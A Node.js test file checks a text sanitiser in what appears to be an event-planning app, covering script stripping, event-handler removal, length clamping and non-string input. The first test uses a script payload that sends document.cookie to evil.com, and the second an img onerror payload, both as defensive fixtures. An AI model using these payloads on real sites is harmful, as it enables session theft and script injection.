import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeInputText } from './planningLogic';

test('sanitizeInputText strips script tags completely', () => {
  const malicious = '<script>fetch("http://evil.com?" + document.cookie)</script>Safe Guest Name';
  const clean = sanitizeInputText(malicious, 100);
  assert.equal(clean.includes('<script>'), false);
  assert.equal(clean.includes('evil.com'), false);
  assert.ok(clean.includes('Safe Guest Name'));
});

test('sanitizeInputText strips anchor and event handler injection payloads', () => {
  const payload = '<img src=x onerror=alert(document.domain)> VIP Guest';
  const clean = sanitizeInputText(payload, 100);
  assert.equal(clean.includes('onerror'), false);
  assert.equal(clean.includes('<img'), false);
  assert.ok(clean.includes('VIP Guest'));
});

test('sanitizeInputText clamps string length correctly', () => {
  const input = '   Aura Atelier Grand Celebration of Luxury Weddings   ';
  const clamped = sanitizeInputText(input, 12);
  assert.equal(clamped.length, 12);
  assert.equal(clamped, 'Aura Atelier');
});

test('sanitizeInputText handles non-string inputs gracefully', () => {
  assert.equal(sanitizeInputText(null, 50), '');
  assert.equal(sanitizeInputText(undefined, 50), '');
  assert.equal(sanitizeInputText(12345, 50), '');
});
